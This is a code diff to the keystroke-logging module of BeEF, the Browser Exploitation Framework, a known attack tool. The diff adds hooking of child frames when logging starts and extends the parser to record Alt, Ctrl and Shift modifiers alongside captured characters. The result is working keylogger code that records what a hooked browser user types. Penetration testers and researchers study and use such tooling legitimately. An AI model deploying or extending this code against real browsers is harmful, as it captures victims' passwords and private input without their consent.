@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 /*!
  * @literal object: beef.logger
  *
@@ -52,6 +43,7 @@ beef.logger = {
         this.y = 0;
         this.target = null;
         this.data = null;
+        this.mods = null;
     },
 	
 	/**
@@ -59,6 +51,7 @@ beef.logger = {
 	 */
 	start: function() {
 
+		beef.browser.hookChildFrames();
 		this.running = true;
 		var d = new Date();
 		this.time = d.getTime();
@@ -241,17 +234,28 @@ beef.logger = {
 	 */
 	parse_stream: function() {
 		var s = '';
-		for (var i in this.stream)
-		{
-			//s += (this.stream[i]['modifiers']['alt']) ? '*alt* ' : '';
-			//s += (this.stream[i]['modifiers']['ctrl']) ? '*ctrl* ' : '';
-			//s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
-			s += String.fromCharCode(this.stream[i]['char']);
+        var mods = '';
+		for (var i in this.stream){
+         try{
+            var mod = this.stream[i]['modifiers'];
+            s += String.fromCharCode(this.stream[i]['char']);
+            if(typeof mod != 'undefined' &&
+                      (mod['alt'] == true ||
+                      mod['ctrl'] == true ||
+                      mod['shift'] == true)){
+                mods += (mod['alt']) ? ' [Alt] ' : '';
+                mods += (mod['ctrl']) ? ' [Ctrl] ' : '';
+                mods += (mod['shift']) ? ' [Shift] ' : '';
+                mods += String.fromCharCode(this.stream[i]['char']);
+            }
+
+         }catch(e){}
 		}
         var k = new beef.logger.e();
         k.type = 'keys';
         k.target = beef.logger.get_dom_identifier();
         k.data = s;
+        k.mods = mods;
         return k;
 	},
 	
